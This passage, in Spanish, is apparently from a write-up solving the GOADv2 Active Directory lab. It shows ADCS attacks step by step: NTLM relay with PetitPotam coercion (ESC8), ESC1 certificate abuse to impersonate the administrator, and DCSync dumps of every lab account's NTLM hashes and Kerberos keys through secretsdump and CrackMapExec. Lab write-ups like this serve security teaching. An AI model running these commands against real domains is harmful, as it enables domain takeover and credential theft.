  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 179, in emit
    self.handleError(record)
Message: '[present-rich] %s'
Arguments: (UpgradePrompt(old='22.2.2', new='23.2.1'),)
```

Una vez instalada, la herramienta Certipy se ejecuta con el siguiente comando:`certipy relay -target 'http://192.168.56.23' -ca 192.168.56.23 -template DomainController` Luego, la herramienta quedará en espera de actividad.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #certipy relay -target 'http://192.168.56.23' -ca 192.168.56.23 -template DomainController
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting http://192.168.56.23/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
```

Una vez que Certipy está en espera, ejecutamos la herramienta PetitPotam con el comando:`PetitPotam.py 192.168.56.104 meereen.essos.local` para llevar a cabo la coerción de autenticación.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody]
└──╼ #PetitPotam.py 192.168.56.104 meereen.essos.local

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:meereen.essos.local[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Después de que el ataque se completa, podemos revisar los resultados de Certipy y notar que ha exportado un archivo llamado "meereen.pfx”

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #certipy relay -target 'http://192.168.56.23' -ca 192.168.56.23 -template DomainController
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting http://192.168.56.23/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
ESSOS\MEEREEN$
[*] Requesting certificate for 'ESSOS\\MEEREEN$' based on the template 'DomainController'
[-] Got error: timed out
[-] Use -debug to print a stacktrace
ESSOS\MEEREEN$
[*] Requesting certificate for 'ESSOS\\MEEREEN$' based on the template 'DomainController'
[*] Got certificate with DNS Host Name 'meereen.essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'meereen.pfx'
[*] Exiting...
```

Utilizando el archivo PFX generado, ahora procedemos a crear un ticket con la misma herramienta Certipy. Ejecutamos el siguiente comando: `certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: meereen$@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'meereen.ccache'
[*] Trying to retrieve NT hash for 'meereen$'
[*] Got hash for 'meereen$@essos.local': aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a
```

La herramienta exportará un archivo llamado "meereen.ccache" una vez que el proceso se haya completado.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll meereen.ccache 
Permissions Size User        Date Modified Name
.rwxrwxrwx  1,4k angussmoody 28 ago 21:17  meereen.ccache
```

A continuación, exportaremos el ticket utilizando el comando: `export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache
```

Una vez que se haya exportado el ticket, se ejecuta el ataque DCsync con el comando:`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`

```csharp
┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
Impacket v0.11.0 - Copyright 2023 Fortra

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a:::
BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:1360f96a3845a2385b97d98f6fefa033:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:d8cdf6de89cfc88ea30464747fb8500f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b46977016f518d492039b32b58925cf9b4192ea145fe2b1d0c2e40e44df021f9
krbtgt:aes128-cts-hmac-sha1-96:d2ecac8e0dd5c4b0190c3dde4ad0862c
krbtgt:des-cbc-md5:c8a708384cefa12f
daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
khal.drogo:des-cbc-md5:b5ec4c1032ef020d
jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
jorah.mormont:des-cbc-md5:b926916289464ffb
sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
sql_svc:des-cbc-md5:91d6b0df31b52a3d
angussmoody:aes256-cts-hmac-sha1-96:da6575ba99aeed92d15fbfe9b23a1c4e8b5c46b9c5db9da8c672f619200d1880
angussmoody:aes128-cts-hmac-sha1-96:7e3cf40500816ea8b445cbd9e25d1ea1
angussmoody:des-cbc-md5:43a4ec689b58fe38
MEEREEN$:aes256-cts-hmac-sha1-96:ad23285a83e260adbd2aed490c76294ed7de3caafd191da9f97590e98b0d1dda
MEEREEN$:aes128-cts-hmac-sha1-96:3401d711a4ffc14bde85aa5438f59ab4
MEEREEN$:des-cbc-md5:b3f1a1f2618667c8
BRAAVOS$:aes256-cts-hmac-sha1-96:8b7984362695ea881eb2fd82dee4b186614db5d181abe80ed6db606b6844ed43
BRAAVOS$:aes128-cts-hmac-sha1-96:631f3578b29fa024d17d679fb3fbe2a5
BRAAVOS$:des-cbc-md5:1af7750262dfb046
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:5a48434fe32d2ccead3abe27f87ac46cb528f42fc2d9af1050b48f325b4d3937
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:3464c356265d6a44d426722c061b56c9
SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
[*] Cleaning up...
```

También puedes llevar a cabo el ataque DCsync utilizando el comando:  `secretsdump.py -hashes ':b50102c4722c9481fc31747a0d0c336a' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local` En este caso, se utiliza el hash proporcionado por la herramienta Certipy.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #secretsdump.py -hashes ':b50102c4722c9481fc31747a0d0c336a' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a:::
BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:1360f96a3845a2385b97d98f6fefa033:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:d8cdf6de89cfc88ea30464747fb8500f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b46977016f518d492039b32b58925cf9b4192ea145fe2b1d0c2e40e44df021f9
krbtgt:aes128-cts-hmac-sha1-96:d2ecac8e0dd5c4b0190c3dde4ad0862c
krbtgt:des-cbc-md5:c8a708384cefa12f
daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
khal.drogo:des-cbc-md5:b5ec4c1032ef020d
jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
jorah.mormont:des-cbc-md5:b926916289464ffb
sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
sql_svc:des-cbc-md5:91d6b0df31b52a3d
angussmoody:aes256-cts-hmac-sha1-96:da6575ba99aeed92d15fbfe9b23a1c4e8b5c46b9c5db9da8c672f619200d1880
angussmoody:aes128-cts-hmac-sha1-96:7e3cf40500816ea8b445cbd9e25d1ea1
angussmoody:des-cbc-md5:43a4ec689b58fe38
MEEREEN$:aes256-cts-hmac-sha1-96:ad23285a83e260adbd2aed490c76294ed7de3caafd191da9f97590e98b0d1dda
MEEREEN$:aes128-cts-hmac-sha1-96:3401d711a4ffc14bde85aa5438f59ab4
MEEREEN$:des-cbc-md5:b3f1a1f2618667c8
BRAAVOS$:aes256-cts-hmac-sha1-96:8b7984362695ea881eb2fd82dee4b186614db5d181abe80ed6db606b6844ed43
BRAAVOS$:aes128-cts-hmac-sha1-96:631f3578b29fa024d17d679fb3fbe2a5
BRAAVOS$:des-cbc-md5:1af7750262dfb046
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:5a48434fe32d2ccead3abe27f87ac46cb528f42fc2d9af1050b48f325b4d3937
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:3464c356265d6a44d426722c061b56c9
SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
[*] Cleaning up...
```

---

## ADCS enumeración con certipy y bloodhound

Utilizando la herramienta [certipy](https://github.com/ly4k/Certipy){:target="_blank"} para realizar una enumeración de las ADCS, para esto ejecutamos el comando `certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12` Como resultado, se obtiene un volcado de información que incluye tres archivos: un archivo de texto, un archivo JSON y un archivo ZIP, que se pueden cargar en BloodHound.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 38 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
[*] Got CA configuration for 'ESSOS-CA'
[*] Saved BloodHound data to '20230829200454_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230829200454_Certipy.txt'
[*] Saved JSON output to '20230829200454_Certipy.json'
```

También es posible utilizar la bandera para mostrar las plantillas vulnerables. En ese caso, se puede ejecutar el comando:  `certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 38 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
[*] Got CA configuration for 'ESSOS-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ESSOS-CA
    DNS Name                            : braavos.essos.local
    Certificate Subject                 : CN=ESSOS-CA, DC=essos, DC=local
    Certificate Serial Number           : 3EFA9E269871C58549E2B860E39DD46B
    Certificate Validity Start          : 2023-01-25 06:16:43+00:00
    Certificate Validity End            : 2028-01-25 06:26:42+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : ESSOS.LOCAL\Administrators
      Access Rights
        ManageCertificates              : ESSOS.LOCAL\Administrators
                                          ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Enterprise Admins
        ManageCa                        : ESSOS.LOCAL\Administrators
                                          ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Enterprise Admins
        Enroll                          : ESSOS.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : ESC4
    Display Name                        : ESC4
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          PendAllRequests
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Code Signing
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : 'ESSOS.LOCAL\\khal.drogo' has dangerous permissions
  1
    Template Name                       : ESC3-CRA
    Display Name                        : ESC3-CRA
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
  2
    Template Name                       : ESC2
    Display Name                        : ESC2
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Any Purpose
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC2                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template can be used for any purpose
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
  3
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'ESSOS.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

Se puede observar información que indica que ESC1 y ESC2 son vulnerables, entre otros.

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2024.png)

Siguiendo el proceso, se procede a cargar el archivo ZIP en BloodHound. Para llevar a cabo esta tarea, se debe utilizar una versión modificada de BloodHound proporcionada por ly4k [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases){:target="_blank"} ly se inicia BloodHound de la misma manera que se hizo en sesiones anteriores. [BloodHound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#bloodhound)

Iniciando el proceso, se inicia el Neo4j, el cual debe ser una versión superior a 4.0.0. Posteriormente, BloodHound se inicia con el comando `./BloodHound --no-sandbox`Una vez que BloodHound se inicia, se procede a cargar el archivo ZIP siguiendo el mismo procedimiento que se realizó en sesiones anteriores. 

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2025.png)

Una vez cargado, BloodHound mostrará estos archivos en la interfaz para su análisis y exploración. 

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2026.png)

Para continuar, se busca la opción "PKI" en la pestaña de Análisis y se hace clic en "Find Certificate Authorities".

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2027.png)

Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de Node Info. y se hace clic en "See Enabled Templates".

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2028.png)

    ---

## ADCS - ESC1

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2029.png)

Se ejecuta certipy para extraer los archivos necesarios para realizar la enumeración, utilizando el comando: `certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
Certipy v4.7.0 - by Oliver Lyak (ly4k)
    
[*] Finding certificate templates
[*] Found 38 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
[*] Got CA configuration for 'ESSOS-CA'
[*] Saved BloodHound data to '20230907210109_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230907210109_Certipy.txt'
[*] Saved JSON output to '20230907210109_Certipy.json'
```

Se corre el BloodHound modificado, [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases){:target="_blank"} y se carga el archivo .zip. Una vez cargado, se procede a la sección PKI - Find Misconfigured Certificate Templates (ESC1)

  
    
![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2030.png)
    
Ahora se ejecuta certipy para obtener el archivo PFX del usuario solicitado, en este caso, el usuario es "administrator".
    
```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
Certipy v4.7.0 - by Oliver Lyak (ly4k)
  
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
    
Se ejecuta certipy para obtener el hash del administrador. Con este hash, se puede proceder a realizar un volcado del NTDS.
    
```jsx
┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.1 - by Oliver Lyak (ly4k)
 
[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```
    
Para este ejemplo, el volcado del NTDS se realizará con CrackMapExec y SecretsDump. Con CrackMapExec, el proceso se llevaría a cabo de la siguiente manera:
    
```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb essos.local -u administrator -H '54296a48cd30259cc88095373cec24da' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         essos.local     445    MEEREEN          [+] essos.local\administrator:54296a48cd30259cc88095373cec24da (Pwn3d!)
SMB         essos.local     445    MEEREEN          [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         essos.local     445    MEEREEN          Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
SMB         essos.local     445    MEEREEN          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         essos.local     445    MEEREEN          krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
SMB         essos.local     445    MEEREEN          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         essos.local     445    MEEREEN          vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         essos.local     445    MEEREEN          daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
SMB         essos.local     445    MEEREEN          viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
SMB         essos.local     445    MEEREEN          khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
SMB         essos.local     445    MEEREEN          jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
SMB         essos.local     445    MEEREEN          sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
SMB         essos.local     445    MEEREEN          angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
